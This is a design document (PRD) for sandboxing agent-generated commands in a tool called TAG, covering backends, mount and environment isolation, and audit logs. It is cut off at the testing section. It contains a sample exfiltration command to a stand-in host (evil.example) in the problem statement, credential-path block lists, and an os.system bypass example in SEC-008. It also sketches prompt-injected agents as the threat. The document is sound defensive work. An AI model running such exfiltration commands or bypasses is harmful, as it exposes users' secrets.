# PRD-021: Sandbox Code Execution (`tag sandbox`)

**Status:** Proposed
**Priority:** P0 Critical
**Estimated Effort:** L (2 sprints / ~4 weeks)
**Affects:** new `src/tag/sandbox.py`, `src/tag/queue_worker.py` (sandbox routing), `src/tag/controller.py` (new `cmd_sandbox_*` commands, `tag sandbox` subcommand group), `pyproject.toml` (optional extras: `docker`, `e2b`), `docs/prd/INDEX.md`

---

## 1. Overview

TAG's swarm and queue features dispatch agent-generated code and shell commands as subprocesses that run directly on the host machine with the same privileges as the user who launched TAG. There is no filesystem isolation, no credential protection, no network boundary, and no resource ceiling. An agent that produces a malicious or erroneous command — whether intentionally crafted or the result of prompt injection — can read `~/.ssh`, exfiltrate `.env` files, persist backdoors, or saturate the host CPU and memory.

This PRD specifies a **Sandbox Code Execution** subsystem (`tag sandbox`) that interposes an isolation layer between TAG's agent loop and the host OS. It provides four runtime backends in descending order of isolation strength:

1. **Docker** — local container via the Docker Engine API; ephemeral, network-isolated, resource-capped container wrapping each command.
2. **E2B** — cloud micro-VM sandbox via the E2B SDK; strongest isolation, zero Docker dependency, ideal for untrusted agent-generated code.
3. **Modal** — serverless GPU/CPU function execution via Modal (already imported in `controller.py`); best fit for compute-heavy agent tasks.
4. **Restricted subprocess** — zero-dependency fallback that wraps `subprocess` with an allowlist of safe commands and a blocked-patterns filter for dangerous file paths and shell metacharacters.

Runtime selection is automatic (Docker detected > restricted subprocess) and overridable per invocation. The `queue_worker.py` job dispatcher respects a `sandbox: true` flag in job configuration to route all queue jobs through the sandbox layer. Swarm sub-agents receive the same treatment via the execution backend selection already present in `controller.py` (PRD-005).

The OWASP AI Agent Security Cheat Sheet explicitly classifies unrestricted shell access as **Dangerous** and prescribes restricted command execution with `blocked_patterns` as the safe posture. This feature resolves that P0 gap.

---

## 2. Problem Statement

- `queue_worker.py:_run_job()` calls `subprocess.run(cmd, ...)` with a 3600-second timeout and no filesystem, network, or resource constraints. Any job payload can read the full host filesystem including credentials, environment files, and SSH keys.
- Swarm sub-agents launched via `controller.py:run_hermes()` and `subprocess.Popen()` inherit the full user environment, including every secret in `hermes_env()`.
- `controller.py` already parses Docker, Modal, and Daytona execution backend config from profile YAML and has a `cmd_doctor` check for the Docker daemon — but this config is applied to the Hermes agent session, not to the subprocess commands the agent itself generates and runs. The sandbox layer is missing entirely.
- A prompt-injected agent could instruct the tool to run `cat ~/.env | curl https://evil.example/exfil -d @-` and it would succeed silently.
- There is no audit trail of what commands agents execute, making post-incident forensics impossible.

---

## 3. Goals

1. **Host filesystem isolation** — sandboxed commands cannot read or write outside explicitly mounted paths; the host root, home directory, and credential stores are invisible inside the sandbox.
2. **Credential protection** — mount validation rejects paths matching `*.env`, `*.key`, `*.pem`, `*secret*`, `*credential*`, `~/.ssh/*`, `~/.aws/*`, and other sensitive patterns; these paths can never enter a sandbox as mounts.
3. **Multi-runtime support with graceful degradation** — Docker, E2B, Modal, and restricted subprocess backends are each independently available; when a preferred runtime is absent, TAG automatically falls back to the next available one and logs the selection.
4. **Transparent queue and swarm integration** — setting `sandbox: true` in a queue job config or `execution.sandbox: true` in a profile config automatically routes all agent-spawned subprocesses through the sandbox layer with no changes to calling code.
5. **Streaming output** — stdout and stderr are streamed in real time to the terminal (or queue result file) so the user can observe long-running sandbox commands without waiting for completion.
6. **Timeout enforcement with guaranteed cleanup** — every sandbox invocation carries a hard timeout; on expiry or SIGINT the runtime backend kills the container/sandbox and releases all resources, preventing orphaned containers.
7. **Audit logging** — every sandbox invocation is appended to `~/.tag/runtime/sandbox-audit.jsonl` with timestamp, runtime, image, command, exit code, duration, and invoking job/profile.
8. **Zero mandatory new dependencies** — the restricted subprocess backend requires no new packages; Docker, E2B, and Modal backends are optional extras that lazy-install on first use.

---

## 4. Non-Goals

1. **Full container orchestration** — TAG does not manage container registries, Kubernetes clusters, multi-container compose stacks, or image build pipelines. Image selection is left to the user.
2. **Network policy enforcement** — TAG does not implement fine-grained egress/ingress firewall rules or eBPF-based network policy. Docker network isolation (`--network none`) is the available primitive; deeper policy (e.g., Cilium, Calico) is out of scope.
3. **Multi-tenant sandboxing** — this feature targets single-user TAG installations. Shared-server multi-tenant isolation (uid namespaces, cgroup hierarchies, seccomp profiles per user) is explicitly out of scope for v1.
4. **Persistent sandbox sessions** — sandboxes are ephemeral by default. Persistent development environments backed by a named container or Daytona workspace are deferred to a follow-on PRD (see Open Questions §13).
5. **Windows container support** — Docker on Windows (Hyper-V and WSL2 backends) is not tested in v1; restricted subprocess is the Windows fallback.
6. **Image vulnerability scanning** — TAG does not scan pulled images for CVEs. Users are responsible for image selection.

---

## 5. User Stories

**US-001 — Docker isolation for agent-generated Python**
As a TAG user running a `code` task type, I want agent-generated Python scripts to execute inside a Docker container so that even if the agent produces malicious code it cannot access my host filesystem or environment variables.

Acceptance: `tag sandbox run --runtime docker --image python:3.12 -- python /app/script.py` runs the script inside a container where `os.environ` does not contain host secrets and `/etc/passwd` reflects the container, not the host.

---

**US-002 — E2B cloud sandbox for fully untrusted code**
As a TAG user evaluating untrusted third-party agents, I want to route their code execution to an E2B micro-VM so that even a container-escape exploit cannot reach my machine.

Acceptance: `tag sandbox run --runtime e2b -- bash -c "whoami"` provisions an E2B sandbox, runs the command, streams output, and closes the sandbox; the host filesystem is never touched.

---

**US-003 — Restricted subprocess fallback with blocked patterns**
As a TAG user on a system without Docker, I want unsafe commands to be rejected automatically so that agent-generated commands touching `.env`, `.key`, `*secret*`, and shell metacharacters are blocked before execution.

Acceptance: `tag sandbox run --runtime restricted -- cat ~/.env` exits with a non-zero code and prints `blocked: path matches credential pattern '*.env'`. Commands without blocked patterns execute normally via `subprocess.run`.

---

**US-004 — Transparent sandbox routing in queue jobs**
As a TAG operator queuing long-running research tasks overnight, I want to set `sandbox: true` in my job configuration so that all subprocesses spawned by `queue_worker.py` are automatically routed through the configured sandbox runtime.

Acceptance: a queue job with `{"sandbox": true, "sandbox_runtime": "docker"}` in its config runs its `tag submit` subprocess inside Docker; the queue result file notes `[sandbox: docker]` at the top.

---

**US-005 — Sandbox integration with swarm sub-agents**
As a TAG user running a kanban swarm with multiple worker agents, I want each worker's execution environment sandboxed so that a compromised worker cannot affect the host or other workers.

Acceptance: a profile with `execution.sandbox: true` and `execution.backend: docker` causes all `run_hermes()` subprocess calls to be wrapped in `sandbox.py`'s Docker backend; worker output streams back to the swarm coordinator unchanged.

---

**US-006 — Inspecting sandbox output**
As a TAG operator, I want to retrieve the stdout/stderr of a completed sandbox session by its sandbox ID so that I can diagnose failures without re-running the job.

Acceptance: `tag sandbox logs <sandbox-id>` prints the captured stdout and stderr of the completed or running sandbox session; `tag sandbox list` shows all active sessions.

---

**US-007 — Destroying a stuck sandbox**
As a TAG operator, I notice a Docker container is consuming 100% CPU and not responding to its timeout. I want to forcibly kill it.

Acceptance: `tag sandbox kill <sandbox-id>` sends `docker kill <container-id>` (or the E2B/Modal equivalent), waits up to 5 seconds for termination, and logs a `killed` event to the audit log.

---

**US-008 — Discovering available runtimes**
As a new TAG user, I want to see which sandbox runtimes are available on my system, their installation status, and whether their credentials are configured.

Acceptance: `tag sandbox runtimes` outputs a table listing docker, e2b, modal, and restricted with status (available/unavailable/needs-credentials) and a one-line fix command for any unavailable runtime.

---

## 6. Proposed CLI Surface

All sandbox subcommands live under `tag sandbox`. The subcommand group is added to the existing `argparse`-based CLI in `controller.py` following the same pattern as `tag queue` and `tag swarm`.

### `tag sandbox run`

```
tag sandbox run [OPTIONS] -- <command> [args...]

OPTIONS
  --runtime docker|e2b|modal|restricted|auto
      Runtime backend. Default: auto (Docker if available, else restricted).

  --image <image>
      Container image to use. Only relevant for Docker backend.
      Default: python:3.12-slim
      Examples: python:3.12, ubuntu:24.04, node:22-alpine

  --timeout <seconds>
      Hard wall-clock timeout in seconds. Default: 300.
      The sandbox is killed and resources released when this expires.

  --mount <host_path>:<container_path>[:<mode>]
      Mount a host directory into the sandbox. Mode is ro (read-only) or rw
      (read-write, default). Can be repeated. Mount paths are validated
      against blocked_patterns before the sandbox starts; any match aborts.
      Example: --mount ./src:/app/src:ro

  --env KEY=VAL
      Inject an environment variable into the sandbox. Can be repeated.
      Host environment variables are NOT inherited unless explicitly passed.

  --no-network
      Disable all network access inside the sandbox (Docker: --network none;
      E2B: firewall all egress; restricted: N/A — no network access anyway).

  --sandbox-id <id>
      Assign a stable sandbox ID for later lookup via `sandbox logs`. Default:
      auto-generated UUID4.

  --quiet
      Suppress sandbox lifecycle messages (start/stop); only emit command output.

  --json
      Emit a JSON object at the end: {sandbox_id, runtime, exit_code,
      duration_s, stdout_bytes, stderr_bytes}.

EXAMPLES
  tag sandbox run --runtime docker --image python:3.12 --mount ./src:/app/src:ro -- python /app/src/main.py
  tag sandbox run --runtime e2b --timeout 120 -- bash -c "pip install requests && python -c 'import requests; print(requests.get(\"https://httpbin.org/get\").status_code)'"
  tag sandbox run --runtime restricted -- ls /tmp
  tag sandbox run -- python -m pytest tests/  # auto-selects Docker if daemon running
```

### `tag sandbox list`

```
tag sandbox list [--json]

Lists all active sandbox sessions (containers/VMs that have not yet been
cleaned up). Columns: SANDBOX_ID, RUNTIME, IMAGE, STATUS, STARTED, TIMEOUT,
PID/CONTAINER_ID.
```

### `tag sandbox logs`

```
tag sandbox logs <sandbox-id> [--follow] [--tail N]

Retrieve captured stdout+stderr for a sandbox session. --follow streams new
output from a running session. --tail N shows the last N lines.
```

### `tag sandbox kill`

```
tag sandbox kill <sandbox-id> [--force] [--timeout 5]

Terminate a running sandbox session. Sends SIGTERM to the container/process,
then waits --timeout seconds, then SIGKILL if still alive. Writes a killed
event to the audit log.
```

### `tag sandbox runtimes`

```
tag sandbox runtimes [--json]

Show all available runtimes and their current status.

Output (table):
  RUNTIME     STATUS          DETAILS
  docker      available       Docker 27.3.1, daemon running
  e2b         needs-creds     E2B_API_KEY not set  →  tag import-e2b --api-key KEY
  modal       available       MODAL_TOKEN_ID/SECRET present
  restricted  always-on       no dependencies required
```

---

## 7. Functional Requirements

**FR-001 Runtime detection and auto-selection**
At sandbox startup, `sandbox.py` probes available runtimes in priority order: Docker (check `docker info` success) > E2B (check `E2B_API_KEY` env) > Modal (check `MODAL_TOKEN_ID` + `MODAL_TOKEN_SECRET`) > restricted subprocess. The first available runtime is selected when `--runtime auto` (the default). The selected runtime is printed unless `--quiet` is passed.

**FR-002 Docker SDK integration**
The Docker backend uses the `docker` Python SDK (`pip install docker`). It must: (a) create an ephemeral container from the specified image with `auto_remove=True`; (b) pass only explicitly declared `--env` variables, never `os.environ`; (c) apply CPU and memory limits (`nano_cpus`, `mem_limit`); (d) disable network by default unless `--no-network` is not set (containers get a user-defined bridge network with no host route by default; full isolation requires `--no-network`); (e) run the command as a non-root user (`--user 65534:65534`, the `nobody` uid); (f) stream `logs(stream=True)` to stdout/stderr in real time; (g) remove the container on completion, timeout, or exception via `finally` block.

**FR-003 E2B SDK integration**
The E2B backend uses `e2b` Python SDK. It must: (a) call `Sandbox.create(timeout=<timeout>)` with the user-provided or default template; (b) upload any declared `--mount` source paths using `sandbox.filesystem.write_bytes()`; (c) run the command via `sandbox.process.start_and_wait(cmd)`; (d) stream stdout/stderr callbacks to the terminal; (e) call `sandbox.close()` in a `finally` block regardless of outcome; (f) surface the E2B sandbox ID for `tag sandbox list`.

**FR-004 Modal integration**
The Modal backend uses `modal` (already in `pyproject.toml` optional extras, already imported in `controller.py`). It must: (a) create a transient Modal `App` and `Function` for the invocation; (b) serialize the command, environment, and any file mounts; (c) call the function and stream its output; (d) enforce the timeout via Modal's `timeout` parameter on the `Function`; (e) not persist Modal apps between invocations unless a `--modal-app-name` override is provided.

**FR-005 Restricted subprocess fallback**
The restricted subprocess backend must: (a) maintain a default `SAFE_COMMANDS` allowlist: `python`, `python3`, `pip`, `pip3`, `node`, `npm`, `ls`, `cat`, `echo`, `grep`, `find`, `mkdir`, `cp`, `mv`, `rm`, `touch`, `curl` (with restrictions), `wget` (with restrictions), `git`; (b) block the command entirely if the base executable is not in the allowlist; (c) scan all command tokens against `BLOCKED_PATTERNS`: `['*.env', '*.key', '*.pem', '*secret*', '*credential*', '*password*', '~/.ssh/*', '~/.aws/*', '~/.gnupg/*']`; (d) reject any token that matches a blocked pattern with exit code 1 and a clear error message; (e) detect and reject shell metacharacters (`|`, `;`, `&&`, `||`, `>`, `<`, `` ` ``, `$()`) in argument tokens to prevent shell injection; (f) run via `subprocess.run(cmd, shell=False, env=<explicit_env_only>, ...)` — never `shell=True`.

**FR-006 Mount path validation**
Before starting any sandbox, all `--mount` source paths are resolved to absolute paths and checked against `BLOCKED_PATTERNS`. Any match raises a `SandboxMountError` and the sandbox does not start. The validation function is `sandbox.validate_mount(host_path: str) -> None`. In addition, mounts are checked for path traversal: the resolved path must not be an ancestor of or equal to any of `~`, `~/.ssh`, `~/.aws`, `~/.config`, `/etc`, `/proc`, `/sys`, `/dev`.

**FR-007 Environment variable isolation**
No sandbox backend passes `os.environ` to the sandboxed process. Only environment variables declared via `--env KEY=VAL` are injected, plus a minimal safe set: `PATH`, `HOME=/tmp`, `TMPDIR=/tmp`. `PYTHONPATH`, `VIRTUAL_ENV`, `TAG_*`, `HERMES_*`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `MODAL_TOKEN_*`, `E2B_API_KEY`, and all `*_SECRET*` / `*_TOKEN*` variables are explicitly excluded and never passed.

**FR-008 Timeout enforcement**
Every sandbox invocation accepts a `--timeout <seconds>` argument (default: 300, minimum: 1, maximum: 3600). When the timeout expires: (a) for Docker, `container.kill()` is called followed by `container.remove(force=True)`; (b) for E2B, `sandbox.close()` is called; (c) for Modal, the function call is cancelled; (d) for restricted subprocess, `proc.kill()` is called; (e) a `SandboxTimeoutError` is raised and the exit code reported as 124 (the POSIX convention for `timeout(1)`).

**FR-009 Real-time stdout/stderr streaming**
All backends must stream output line-by-line to the calling terminal (or to the queue result buffer). Output must not be buffered until completion. Docker uses `logs(stream=True)`; E2B uses process stdout/stderr callbacks; Modal uses `function.remote_gen()`; restricted subprocess uses `subprocess.Popen` with `stdout=PIPE, stderr=PIPE` and a `select`/`read` loop.

**FR-010 Exit code capture and propagation**
`SandboxRuntime.run()` returns `(stdout: str, stderr: str, exit_code: int)`. The `tag sandbox run` command exits with the same exit code as the sandboxed command, allowing use in shell pipelines and CI scripts.

**FR-011 Sandbox session registry**
Active and recently completed sandbox sessions are written to `~/.tag/runtime/sandbox-sessions.jsonl`. Each record contains: `sandbox_id`, `runtime`, `image`, `command`, `started_at`, `finished_at`, `exit_code`, `container_id` (or E2B sandbox ID), `pid`. `tag sandbox list` reads this file and filters to sessions whose `finished_at` is null or within the last 24 hours.

**FR-012 Audit logging**
Every sandbox invocation appends a record to `~/.tag/runtime/sandbox-audit.jsonl`. Fields: `timestamp` (ISO-8601 UTC), `sandbox_id`, `runtime`, `image`, `command` (list), `env_keys` (list of injected env key names, NOT values), `mounts` (list of host:container:mode), `timeout`, `exit_code`, `duration_s`, `job_id` (if invoked from queue), `profile` (if invoked from swarm), `killed` (bool). This file must not be rotated automatically; users are responsible for archival.

**FR-013 Queue worker integration**
`queue_worker.py:_run_job()` must check `job.get("sandbox")` before running the job subprocess. If truthy, it constructs a `SandboxConfig` from the job's `sandbox_runtime`, `sandbox_image`, `sandbox_timeout`, and `sandbox_mounts` fields, instantiates the appropriate backend, and runs the `tag submit` command inside the sandbox instead of bare `subprocess.run`. The result file is written by reading the sandbox's captured stdout. The queue result includes `[sandbox: <runtime>]` in the header.

**FR-014 `tag sandbox runtimes` runtime probe**
`cmd_sandbox_runtimes` must: (a) attempt to import `docker` and run `docker.from_env().ping()`; (b) check for `E2B_API_KEY` in environment and attempt `import e2b`; (c) check for `MODAL_TOKEN_ID` + `MODAL_TOKEN_SECRET` and attempt `import modal`; (d) always report `restricted` as available. Each probe completes in < 2 seconds. Results are cached for 60 seconds in process memory.

**FR-015 Cleanup on abnormal exit**
`sandbox.py` registers `atexit` and `signal.signal(SIGTERM, ...)` handlers that iterate all active sandbox sessions in the current process and call their backend's `kill()` method. Docker containers in the session registry that are still running when the TAG process exits are removed with `docker rm -f`. This prevents orphaned containers surviving a `kill -9` on the TAG process (handled via Docker's `--rm` flag which is set unconditionally).

**FR-016 `--mount` read-only enforcement**
When a mount is declared as `:ro`, the Docker backend passes `mode='ro'` in the volume binding dict; the E2B backend uploads the file but never syncs writes back to the host; the restricted subprocess backend `chmod a-w` the mounted path inside a temporary copy directory before use.

---

## 8. Non-Functional Requirements

**NFR-001 Docker container startup latency**
For images already present on the host, `sandbox run --runtime docker` must produce first output within 5 seconds of the CLI invocation. Image pull latency is excluded from this budget and is reported separately with a progress indicator.

**NFR-002 Cleanup on crash**
Even if the TAG process crashes with a Python exception or OOM kill, Docker containers started with `--rm` are removed by the Docker daemon automatically. E2B sandboxes time out within their `timeout` parameter (max 300 seconds by default). Modal functions are killed by Modal's scheduler.

**NFR-003 Resource limits**
The Docker backend applies per-container limits: CPU (`nano_cpus=1_000_000_000`, equivalent to 1 vCPU) and memory (`mem_limit="512m"`) by default. These are overridable via `TAG_SANDBOX_CPU_LIMIT` and `TAG_SANDBOX_MEM_LIMIT` environment variables. The restricted subprocess backend uses `resource.setrlimit(RLIMIT_AS, ...)` (Unix only) to cap address space at 2 GB.

**NFR-004 Audit log integrity**
Each audit log line is an independent JSON object (JSONL format) written atomically via `open(path, 'a', encoding='utf-8')` with a `fcntl.flock(LOCK_EX)` guard (Unix) or a threading lock (Windows fallback). Log writes must not fail silently; exceptions are printed to stderr but do not abort the sandbox run.

**NFR-005 Error message quality**
When a sandbox invocation is blocked (credential path, unsupported runtime, missing Docker daemon), the error message must: (a) identify the specific rule violated; (b) suggest a corrective action; (c) exit with a distinct non-zero exit code that is documented in the help text.

**NFR-006 No silent fallback from Docker to restricted subprocess on first use**
If the user explicitly requests `--runtime docker` and Docker is unavailable, the command must fail with a clear error rather than falling back silently. Silent fallback is only permitted when `--runtime auto` (the default) is in effect.

**NFR-007 Compatibility**
`sandbox.py` must import without error on Python 3.11–3.13 even when `docker`, `e2b`, and `modal` are not installed. Runtime backends are loaded lazily. All four backends must work on macOS 13+, Ubuntu 22.04+, and Debian 12+. Windows support is restricted to the restricted subprocess backend.

---

## 9. Technical Design

### 9.1 New file: `src/tag/sandbox.py`

The module exposes:

- `SandboxConfig` — dataclass holding runtime, image, timeout, mounts, env, no_network, sandbox_id.
- `SandboxRuntime` — abstract base class (ABC) with abstract method `run(cmd: list[str], config: SandboxConfig) -> SandboxResult` and optional `kill(sandbox_id: str) -> None`.
- `SandboxResult` — dataclass: `stdout: str`, `stderr: str`, `exit_code: int`, `duration_s: float`, `sandbox_id: str`, `runtime: str`.
- `SandboxMountError(ValueError)` — raised when a mount path matches a blocked pattern.
- `SandboxTimeoutError(RuntimeError)` — raised on timeout; sets `exit_code=124`.
- `SandboxBlockedCommandError(ValueError)` — raised by the restricted backend on blocked command/pattern.
- `BLOCKED_PATTERNS: list[str]` — module-level constant; overridable by `TAG_SANDBOX_BLOCKED_PATTERNS` env var (colon-separated).
- `validate_mount(host_path: str) -> None` — raises `SandboxMountError` on match.
- `get_runtime(name: str) -> SandboxRuntime` — factory; `name="auto"` triggers detection.
- `run_sandboxed(cmd: list[str], config: SandboxConfig) -> SandboxResult` — convenience wrapper used by queue_worker and controller.

```
SandboxRuntime (ABC)
  ├── DockerSandboxRuntime
  ├── E2BSandboxRuntime
  ├── ModalSandboxRuntime
  └── RestrictedSubprocessRuntime
```

### 9.2 Runtime interface

```python
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class SandboxConfig:
    runtime: str = "auto"
    image: str = "python:3.12-slim"
    timeout: int = 300
    mounts: list[str] = field(default_factory=list)   # "host:container:mode"
    env: dict[str, str] = field(default_factory=dict)
    no_network: bool = False
    sandbox_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    cpu_limit: float = 1.0          # vCPUs
    mem_limit_mb: int = 512

@dataclass
class SandboxResult:
    stdout: str
    stderr: str
    exit_code: int
    duration_s: float
    sandbox_id: str
    runtime: str

class SandboxRuntime(ABC):
    @abstractmethod
    def run(self, cmd: list[str], config: SandboxConfig) -> SandboxResult: ...

    def kill(self, sandbox_id: str) -> None:
        """Terminate a running sandbox. Default: no-op."""
        pass

    def is_available(self) -> bool:
        """Return True if this runtime can be used on the current system."""
        return True
```

### 9.3 Docker backend

Key implementation notes:

- Import `docker` lazily inside `DockerSandboxRuntime.run()` to avoid hard dependency.
- Use `client.containers.run(image, cmd, detach=True, ...)` rather than `exec_run` so the container is a distinct unit with its own lifecycle.
- Volume bindings are built from `config.mounts` after `validate_mount()` is called on each host path.
- `environment` dict is constructed from `config.env` only; `os.environ` is never read.
- `network_mode="none"` when `config.no_network` is True, else `network_mode="bridge"` with `dns=["8.8.8.8"]`.
- Streaming: iterate `container.logs(stream=True, stdout=True, stderr=True)` in a thread; write chunks to a `queue.Queue`; the main thread drains the queue and writes to `sys.stdout`.
- On timeout: `container.kill(signal="SIGKILL")` then `container.remove(force=True)`.
- Container is always started with `user="65534:65534"` (nobody) and `read_only=True` on the root filesystem; only explicitly mounted volumes are writable.
- Security options: `security_opt=["no-new-privileges:true"]`, `cap_drop=["ALL"]`.

### 9.4 E2B backend

Key implementation notes:

- Import `e2b` lazily. Require `E2B_API_KEY` env var; raise a clear error if absent.
- Use `e2b.Sandbox(timeout=config.timeout)` (or `AsyncSandbox` if async context available).
- For each mount in `config.mounts`: resolve the host path, read bytes, write to the container path via `sandbox.filesystem.write_bytes(container_path, data)`.
- Execute via `sandbox.process.start_and_wait(cmd_string, env_vars=config.env, on_stdout=<cb>, on_stderr=<cb>)`.
- The sandbox ID is `sandbox.id`; store in `SandboxResult.sandbox_id`.
- Always call `sandbox.close()` in a `finally` block.
- E2B sandboxes are billed per second; log duration for cost awareness.

### 9.5 Modal backend

Key implementation notes:

- Modal is already listed in `pyproject.toml` optional extras and has existing credential checking in `controller.py:cmd_doctor`.
- Import `modal` lazily.
- Dynamically define a `modal.App` and an `@app.function(image=modal.Image.debian_slim(), timeout=config.timeout)` per invocation — no persistent app state.
- Serialize command and env as function arguments; return `(stdout, stderr, exit_code)` tuple from the remote function.
- For file mounts, use `modal.Mount.from_local_dir(host_path, remote_path=container_path)` after `validate_mount()`.
- Call `f.remote(...)` synchronously from the `run()` method.

### 9.6 Restricted subprocess backend

Key implementation notes:

```python
SAFE_COMMANDS = {
    "python", "python3", "pip", "pip3",
    "node", "npm", "npx",
    "ls", "cat", "echo", "grep", "find",
    "mkdir", "cp", "mv", "rm", "touch",
    "curl", "wget", "git",
    "bash", "sh",  # only with shell=False; individual args still scanned
}

BLOCKED_PATTERNS = [
    "*.env", "*.key", "*.pem", "*.p12", "*.pfx",
    "*secret*", "*credential*", "*password*", "*passwd*",
    "~/.ssh/*", "~/.aws/*", "~/.gnupg/*", "~/.config/gcloud/*",
    "/etc/shadow", "/etc/passwd", "/etc/sudoers",
    "id_rsa", "id_ed25519", "id_ecdsa",
]

SHELL_METACHARACTERS = re.compile(r'[|;&><`$]|\$\(|\|\|')
```

- `validate_command(cmd: list[str]) -> None` — checks base executable against `SAFE_COMMANDS`, all tokens against `BLOCKED_PATTERNS` (using `fnmatch`), all tokens against `SHELL_METACHARACTERS`.
- Run via `subprocess.Popen(cmd, shell=False, env=safe_env, stdout=PIPE, stderr=PIPE)`.
- On Unix, apply `resource.setrlimit(resource.RLIMIT_AS, (2 * 1024**3, resource.RLIM_INFINITY))` before exec.
- Respect timeout via `proc.wait(timeout=config.timeout)` + `proc.kill()` on `TimeoutExpired`.

### 9.7 `queue_worker.py` integration

In `_run_job()`, before calling `subprocess.run(cmd, ...)`, check:

```python
sandbox_cfg = job.get("sandbox_config")  # dict or None
if job.get("sandbox") or sandbox_cfg:
    from tag.sandbox import SandboxConfig, run_sandboxed
    sc = SandboxConfig(
        runtime=job.get("sandbox_runtime", "auto"),
        image=job.get("sandbox_image", "python:3.12-slim"),
        timeout=job.get("sandbox_timeout", 3600),
    )
    result = run_sandboxed(cmd, sc)
    output = result.stdout + ("\n\n---\n" + result.stderr if result.stderr else "")
    result_path.write_text(
        f"# Queue Job: {job['id']}\n[sandbox: {result.runtime}]\n\n{output}",
        encoding="utf-8",
    )
    return result.exit_code, result_path, ""
```

### 9.8 `controller.py` integration

Add a `sandbox` subcommand group following the pattern of `queue`:

```python
# In build_parser():
sub_sandbox = subparsers.add_parser("sandbox", help="Isolated code execution environments")
sandbox_sub = sub_sandbox.add_subparsers(dest="sandbox_cmd")

# sandbox run
p_srun = sandbox_sub.add_parser("run", ...)
p_srun.add_argument("--runtime", default="auto", choices=["auto","docker","e2b","modal","restricted"])
p_srun.add_argument("--image", default="python:3.12-slim")
p_srun.add_argument("--timeout", type=int, default=300)
p_srun.add_argument("--mount", action="append", dest="mounts", default=[])
p_srun.add_argument("--env", action="append", dest="env_pairs", default=[])
p_srun.add_argument("--no-network", action="store_true")
p_srun.add_argument("--sandbox-id")
p_srun.add_argument("--quiet", action="store_true")
p_srun.add_argument("--json", action="store_true")
p_srun.add_argument("command", nargs=argparse.REMAINDER)
p_srun.set_defaults(func=cmd_sandbox_run)

# sandbox list, logs, kill, runtimes (similar pattern)
```

Dispatch in `main()` routes `args.sandbox_cmd` to the appropriate `cmd_sandbox_*` function.

---

## 10. Security Considerations

**SEC-001 Docker socket exposure**
The Docker backend requires read-write access to `/var/run/docker.sock`. Any process that can write to the Docker socket can escalate to root. TAG must: (a) document this risk prominently in `tag sandbox runtimes` output; (b) suggest rootless Docker (`dockerd-rootless-setuptool.sh`) as the preferred installation; (c) never mount the Docker socket inside a sandboxed container (validate that no `--mount` path resolves to `/var/run/docker.sock`).

**SEC-002 Container escape prevention**
Known Docker escape vectors are mitigated by: `--cap-drop ALL`, `--security-opt no-new-privileges:true`, `--read-only` root filesystem, `--user 65534:65534` (nobody), no `--privileged` flag ever, no mounted Docker socket inside the container. `--pid=private` is set to prevent `/proc` pid namespace inspection of host processes.

**SEC-003 Credential mount prevention**
`validate_mount()` is the primary defence. It must be called for every mount path before any backend starts, and the check must happen on the resolved absolute path (after `Path.expanduser().resolve()`) to prevent `../../.env` traversal bypasses. The check uses both `fnmatch` (for glob patterns) and a set of exact path prefixes for high-value directories (`HOME/.ssh`, `HOME/.aws`, etc.).

**SEC-004 Network isolation**
By default, Docker containers are started on a private bridge network with no host-route. Internet egress is available unless `--no-network` is passed. Users handling truly sensitive workloads should always pass `--no-network`. The documentation must state clearly that the bridge network does not prevent egress to the internet without `--no-network`.

**SEC-005 Resource exhaustion (fork bomb / CPU/memory)**
Docker: `--pids-limit 512` prevents fork bombs; `--cpu-period` / `--cpu-quota` cap CPU; `--memory` caps RAM; `--memory-swap` is set equal to `--memory` to prevent swap amplification. Restricted subprocess: `RLIMIT_NPROC` limits child processes (Unix only). E2B: inherently resource-capped by the sandbox tier. Modal: inherently resource-capped by the function definition.

**SEC-006 Audit log tamperability**
The audit log at `~/.tag/runtime/sandbox-audit.jsonl` is written by the user's own process. It is not cryptographically signed and can be tampered with by the user themselves or by any process running as the same uid. This is acceptable for single-user installations. The audit log is intended for operational visibility, not forensic non-repudiation. Enterprises requiring tamper-evidence should forward the log to a SIEM via `tail -f | logger`.

**SEC-007 E2B API key management**
The E2B API key is read from `E2B_API_KEY` environment variable and never written to disk by `sandbox.py`. It must not appear in the audit log (only the key name `E2B_API_KEY` is logged, not the value). The key must not be passed as a command-line argument (which would appear in `ps aux`). E2B sandboxes are isolated micro-VMs; the API key grants billing authority, not code execution on the user's machine.

**SEC-008 Restricted subprocess bypass via shell metacharacters**
The restricted backend's `SHELL_METACHARACTERS` check must be applied to every token in the argument list, not just the command. A command like `['python', '-c', 'import os; os.system("cat ~/.env")']` passes the metacharacter check but executes arbitrary code via Python's `os.system`. This is an accepted limitation of the restricted backend: it is not a security boundary against Python/Node code; it is a defence against accidental credential exposure via direct path arguments. Users who need strong isolation must use Docker or E2B.

**SEC-009 Image pull from untrusted registries**
When `--image` is specified, the Docker backend pulls the image with `client.images.pull(image)`. A user or agent could specify a malicious image. TAG does not verify image signatures or scan for vulnerabilities. Mitigations: (a) document this risk; (b) implement an allowlist `TAG_SANDBOX_ALLOWED_IMAGES` env var (colon-separated, supports `*` glob) that defaults to `python:*`, `ubuntu:*`, `debian:*`, `node:*`, `alpine:*`; (c) images not matching the allowlist are rejected unless `TAG_SANDBOX_ALLOW_ANY_IMAGE=1` is set.

**SEC-010 Privilege escalation via setuid binaries in container**
`--cap-drop ALL` removes all Linux capabilities including `CAP_SETUID`. Combined with `--no-new-privileges`, setuid binaries inside the container cannot escalate privileges. This is effective only when the container runs as a non-root user (`--user 65534:65534`).

**SEC-011 Secrets in environment variables injected via `--env`**
Users can explicitly inject secrets into the sandbox via `--env OPENAI_API_KEY=sk-...`. TAG does not prevent this; it is the user's explicit choice. TAG does prevent *accidental* injection by never passing `os.environ` by default. The audit log records the *names* of injected env keys but never their values.

**SEC-012 Symlink attacks in mount paths**
Before mounting a host path, `sandbox.py` resolves it with `Path.resolve()` (which follows symlinks) and then re-validates the resolved path against `BLOCKED_PATTERNS`. A symlink pointing to `~/.ssh/id_rsa` will resolve to the real path, which matches the `id_rsa` blocked pattern. This prevents symlink-based bypass of mount validation.

**SEC-013 Timeout as a denial-of-service vector**
A malicious prompt could instruct the agent to run a very short timeout with a sleep command, causing rapid sandbox churn and Docker API load. TAG rate-limits `tag sandbox run` invocations to 60 per minute per process via an in-memory token bucket. This limit is not a hard security boundary but reduces accidental resource exhaustion.

---

## 11. Testing Strategy

### Unit tests (`tests/test_sandbox.py`)

